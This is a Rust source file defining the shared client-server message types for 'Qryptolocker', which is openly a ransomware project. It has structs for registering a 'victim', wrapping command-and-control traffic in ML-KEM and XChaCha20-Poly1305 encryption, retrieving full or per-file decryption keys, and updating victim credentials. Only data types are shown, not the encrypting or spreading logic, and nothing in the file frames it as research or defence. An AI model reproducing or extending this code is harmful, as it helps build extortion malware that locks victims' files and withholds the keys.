//! Shared types for client-server communication in Qryptolocker
//!
//! This crate contains all request/response structs used for communication
//! between the client and server binaries.

use serde::{Deserialize, Serialize};
use uuid::Uuid;
use zeroize::Zeroize;

// ============================================================================
// Encrypted Communication Layer
// ============================================================================

/// Encrypted request wrapper using ML-KEM + XChaCha20-Poly1305
#[derive(Debug, Serialize, Deserialize)]
pub struct EncryptedRequest {
    /// ML-KEM ciphertext
    pub kem_ct: Vec<u8>,
    /// AEAD encrypted payload
    pub payload_ct: Vec<u8>,
    /// Client's ephemeral verification key
    pub client_vk: Vec<u8>,
    /// AEAD nonce
    pub nonce: [u8; 24],
}

/// Encrypted response wrapper
#[derive(Debug, Serialize, Deserialize)]
pub struct EncryptedResponse {
    /// AEAD encrypted payload
    pub payload_ct: Vec<u8>,
    /// AEAD nonce
    pub nonce: [u8; 24],
}

/// Internal struct for signed payload (used inside AEAD encryption)
#[derive(Debug, Serialize, Deserialize)]
pub struct SignedPayload {
    pub data: Vec<u8>,
    pub signature: Vec<u8>,
    // Replay attacks protection
    pub timestamp: u64,
}

// ============================================================================
// Client Registration
// ============================================================================

/// Request to register a new victim
#[derive(Debug, Serialize, Deserialize, Zeroize)]
pub struct RegisterClientRequest {
    pub root_word: String,
    pub key_wrapper_salt: [u8; 16],
    pub salt_word_global: [u8; 16],
}

/// Response after victim registration
#[derive(Debug, Serialize, Deserialize)]
pub struct RegisterClientResponse {
    pub client_id: Uuid,
}

// ============================================================================
// Decryption Credentials
// ============================================================================

/// Request to retrieve decryption keys (for full decryption)
#[derive(Debug, Serialize, Deserialize)]
pub struct RetrieveKeyRequest {
    pub client_id: String,
}

/// Full credentials needed to decrypt the entire file tree
#[derive(Debug, Serialize, Deserialize, Zeroize)]
pub struct FullDecryptCredentials {
    pub root_word: String,
    pub key_wrapper_salt: [u8; 16],
    pub proof_plaintext: [u8; 32],
    pub proof_ciphertext: Vec<u8>,
}

// ============================================================================
// Single File Decryption
// ============================================================================

/// Request to get the word for a specific file
#[derive(Debug, Serialize, Deserialize)]
pub struct GetFileWordRequest {
    pub file_path: String,
    pub client_id: String,
}

/// Response containing the word for a specific file
#[derive(Debug, Serialize, Deserialize)]
pub struct GetFileWordResponse {
    pub word: String,
    pub file_path: String,
}

// ============================================================================
// Credential Updates
// ============================================================================

/// Request to update victim credentials (password change)
#[derive(Debug, Serialize, Deserialize)]
pub struct UpdateCredentialsRequest {
    pub client_id: String,
    pub new_root_word: String,
    pub new_key_wrapper_salt: [u8; 16],
}

/// Response after credential update
#[derive(Debug, Serialize, Deserialize)]
pub struct UpdateCredentialsResponse {
    pub success: bool,
}
